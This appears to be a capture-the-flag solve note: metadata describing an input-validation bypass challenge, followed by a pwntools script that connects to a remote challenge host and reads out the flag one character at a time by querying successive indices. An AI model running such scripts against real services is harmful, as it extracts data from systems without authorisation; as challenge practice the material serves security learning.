---
ai_date: '2025-04-27 05:16:14'
ai_summary: Buffer overflow exploitation through input validation bypass (integer
  overflow) in a command-line interface
ai_tags:
- bof
- overflow
- input-validation
created: 2024-07-17T00:57
points: 900
solves: 463
updated: 2024-08-04T19:30
---

```python
from pwn import *
import re
context.log_level = 'error'
conn = remote('94.237.51.8', 48661)
conn.recv()

for i in range(999):

    conn.sendline(str(i).encode())
    t = conn.recvuntil(b'Enter an index: ').decode()
    t = re.search('at Index \\d+: (.)\n', t).group(1)
    print(t, end='', flush=True)
    if t == '}':
        break
print()
conn.close()
```